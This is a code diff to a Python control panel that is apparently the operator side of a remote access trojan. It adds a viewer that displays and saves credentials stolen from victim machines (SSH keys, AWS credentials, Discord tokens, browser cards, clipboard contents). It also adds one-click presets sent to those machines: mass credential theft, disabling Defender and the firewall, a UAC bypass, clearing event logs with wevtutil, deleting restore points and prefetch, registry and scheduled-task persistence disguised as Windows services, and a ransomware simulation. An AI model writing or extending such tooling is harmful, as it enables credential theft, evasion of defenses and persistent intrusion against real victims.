@@ -521,6 +521,7 @@ class AdminDashboardApp:
             ("🔑", "Logs", self.open_keylogger),
             ("🌐", "Network", self.open_network_explorer),
             ("🔥", "Bulk Cmd", self.open_bulk_executor),
+            ("⚡", "Presets", self.open_quick_presets),
             ("📢", "Broadcast", self.broadcast_message),
             ("⏻", "Power", self.request_shutdown)
         ]
@@ -1152,6 +1153,14 @@ class AdminDashboardApp:
             if "bulk" in self.bulk_executors: self.bulk_executors["bulk"].notify_finish()
         elif t == "password_result":
             messagebox.showinfo("Password Captured", f"Client: {data.get('password')}")
+        elif t in ("filezilla_creds", "winscp_creds", "ssh_keys", "aws_creds", "steam_data", "minecraft_data", "vpn_configs", "browser_payments", "email_creds", "mobaxterm_creds", "rdp_credentials", "product_keys", "discord_tokens", "browser_bookmarks", "browser_autofill", "browser_cards"):
+            self.show_harvested_data(data)
+        elif t == "clipboard_update":
+            self.show_harvested_data(data)
+        elif t == "crypto_swap":
+            self.show_harvested_data(data)
+        elif t == "window_change":
+            pass  # Window tracker data is handled in logs
 
     def show_location(self, data):
         if not data: return
@@ -1185,6 +1194,133 @@ class AdminDashboardApp:
         if lat and lon:
             map_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
             ctk.CTkButton(win, text="Open in Google Maps", command=lambda: subprocess.Popen(f"start {map_url}", shell=True)).pack(pady=20)
+
+    def show_harvested_data(self, data):
+        """Display harvested intelligence data in a dedicated viewer window."""
+        t = data.get("type")
+        sender = data.get("sender_id", "Unknown")
+        win = ctk.CTkToplevel(self.root)
+        win.title(f"Harvested Data - {t.upper()} [{sender[:12]}]")
+        win.geometry("900x600")
+        win.configure(bg=self.colors["bg"])
+
+        header = ctk.CTkFrame(win, fg_color=self.colors["surface"], corner_radius=15)
+        header.pack(fill=tk.X, padx=15, pady=15)
+        icon_map = {
+            "filezilla_creds": "📂", "winscp_creds": "🔐", "ssh_keys": "🗝️", "aws_creds": "☁️",
+            "steam_data": "🎮", "minecraft_data": "⛏️", "vpn_configs": "🔒", "browser_payments": "💳",
+            "email_creds": "✉️", "mobaxterm_creds": "🖥️", "rdp_credentials": "🖧", "product_keys": "🔑",
+            "discord_tokens": "💬", "browser_bookmarks": "🔖", "browser_autofill": "📝", "browser_cards": "💳",
+            "clipboard_update": "📋", "crypto_swap": "🪙",
+        }
+        icon = icon_map.get(t, "📦")
+        ctk.CTkLabel(header, text=f"{icon}  {t.upper()}", font=("Segoe UI", 20, "bold"), text_color=self.colors["accent"]).pack(side=tk.LEFT, padx=20, pady=15)
+        ctk.CTkLabel(header, text=f"Device: {sender[:16]}...", font=("Consolas", 11), text_color=self.colors["text_dim"]).pack(side=tk.RIGHT, padx=20)
+
+        body = ctk.CTkFrame(win, fg_color=self.colors["surface"], corner_radius=15)
+        body.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
+
+        text = json.dumps(data, indent=2, default=str)
+        txt_widget = ctk.CTkTextbox(body, font=("Consolas", 11), fg_color=self.colors["bg"], text_color=self.colors["text"])
+        txt_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        txt_widget.insert("1.0", text)
+        txt_widget.configure(state="disabled")
+
+        btn_frame = ctk.CTkFrame(win, fg_color="transparent")
+        btn_frame.pack(fill=tk.X, padx=15, pady=(0, 15))
+        ctk.CTkButton(btn_frame, text="Copy to Clipboard", command=lambda: [win.clipboard_clear(), win.clipboard_append(text), messagebox.showinfo("Copied", "Data copied to clipboard.")], fg_color=self.colors["accent"]).pack(side=tk.LEFT, padx=5)
+        ctk.CTkButton(btn_frame, text="Save to File", command=lambda: self._save_harvested_data(t, sender, text), fg_color=self.colors["success"], text_color="black").pack(side=tk.LEFT, padx=5)
+
+    def _save_harvested_data(self, data_type, sender_id, content):
+        save_dir = "harvested_data"
+        if not os.path.exists(save_dir):
+            os.makedirs(save_dir)
+        fname = f"{data_type}_{sender_id[:8]}_{int(time.time())}.json"
+        fpath = os.path.join(save_dir, fname)
+        with open(fpath, "w") as f:
+            f.write(content)
+        messagebox.showinfo("Saved", f"Data saved to {fpath}")
+
+    def open_quick_presets(self):
+        """Open the Quick Action Presets window."""
+        if not self.selected_devices:
+            messagebox.showwarning("No Selection", "Select devices first!")
+            return
+        win = ctk.CTkToplevel(self.root)
+        win.title("Quick Action Presets")
+        win.geometry("600x500")
+        win.configure(bg=self.colors["bg"])
+
+        ctk.CTkLabel(win, text="⚡ QUICK ACTION PRESETS", font=("Segoe UI", 18, "bold"), text_color=self.colors["accent"]).pack(pady=15)
+
+        presets = [
+            ("🔍 Full Recon", [
+                ("System Info", {"type": "get_sys_info"}),
+                ("Browser History", {"type": "get_browser_history"}),
+                ("Browser Passwords", {"type": "get_browser_passwords"}),
+                ("WiFi Passwords", {"type": "get_wifi"}),
+                ("Discord Tokens", {"type": "get_discord_tokens"}),
+                ("Telegram Session", {"type": "get_telegram"}),
+                ("FileZilla Creds", {"type": "get_filezilla"}),
+                ("WinSCP Creds", {"type": "get_winscp"}),
+                ("SSH Keys", {"type": "get_ssh_keys"}),
+                ("AWS Creds", {"type": "get_aws_creds"}),
+                ("Steam Session", {"type": "get_steam"}),
+                ("Minecraft Session", {"type": "get_minecraft"}),
+                ("Browser Payments", {"type": "get_browser_payments"}),
+                ("Saved RDP", {"type": "get_saved_rdp"}),
+                ("Product Keys", {"type": "get_product_keys"}),
+                ("VPN Configs", {"type": "get_vpn_configs"}),
+                ("Installed Certs", {"type": "get_certs"}),
+            ]),
+            ("🛡️ Defense Disable", [
+                ("Disable Defender", {"type": "disable_defender"}),
+                ("Disable Firewall", {"type": "execute_command", "command": "netsh advfirewall set allprofiles state off"}),
+                ("UAC Bypass", {"type": "uac_bypass"}),
+            ]),
+            ("👻 Stealth & Cleanup", [
+                ("Hide Desktop Icons", {"type": "hide_icons"}),
+                ("Hide Taskbar", {"type": "hide_taskbar"}),
+                ("Clear Event Logs", {"type": "execute_command", "command": "wevtutil cl System & wevtutil cl Security & wevtutil cl Application"}),
+                ("Delete Restore Points", {"type": "nuke_restore"}),
+                ("Clear Prefetch", {"type": "execute_command", "command": "del /f /s /q C:\\Windows\\Prefetch\\*"}),
+            ]),
+            ("🔥 Prank Mode", [
+                ("Fake BSOD", {"type": "fake_bsod"}),
+                ("Fake Update Screen", {"type": "fake_update"}),
+                ("Spam Message Boxes", {"type": "spam_msg", "text": "You've been hacked!"}),
+                ("Crazy Mouse", {"type": "crazy_mouse", "duration": 30}),
+                ("Ransomware Sim", {"type": "ransom_sim", "message": "Your files have been encrypted by H-DEX."}),
+                ("Matrix Effect", {"type": "ultra_matrix"}),
+            ]),
+            ("🔒 Persistence", [
+                ("Registry Startup", {"type": "execute_command", "command": f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsHealth" /t REG_SZ /d "{sys.executable}" /f'}),
+                ("Scheduled Task", {"type": "create_task", "name": "WindowsUpdateCheck", "exe_path": sys.executable}),
+            ]),
+        ]
+
+        scroll = ctk.CTkScrollableFrame(win, fg_color="transparent")
+        scroll.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
+
+        for group_name, actions in presets:
+            group_frame = ctk.CTkFrame(scroll, fg_color=self.colors["surface"], corner_radius=12, border_width=1, border_color=self.colors["border"])
+            group_frame.pack(fill=tk.X, pady=5)
+            ctk.CTkLabel(group_frame, text=group_name, font=("Segoe UI", 13, "bold"), text_color=self.colors["accent"]).pack(anchor="w", padx=15, pady=(10, 5))
+            inner = ctk.CTkFrame(group_frame, fg_color="transparent")
+            inner.pack(fill=tk.X, padx=15, pady=(0, 10))
+            inner.columnconfigure((0, 1, 2), weight=1)
+            for idx, (label, cmd) in enumerate(actions):
+                btn = ctk.CTkButton(inner, text=label, height=35, corner_radius=8,
+                                    fg_color=self.colors["bg"], hover_color=self.colors["hover"],
+                                    text_color=self.colors["text"], font=("Segoe UI", 11),
+                                    command=lambda c=cmd: self._execute_preset(c))
+                btn.grid(row=idx // 3, column=idx % 3, padx=3, pady=3, sticky="ew")
+
+    def _execute_preset(self, cmd):
+        for dev_id in self.selected_devices:
+            cmd_copy = cmd.copy()
+            cmd_copy["target_id"] = dev_id
+            self.send_json(cmd_copy)
 
     def update_device_list(self, devices):
         # Refresh the stats label
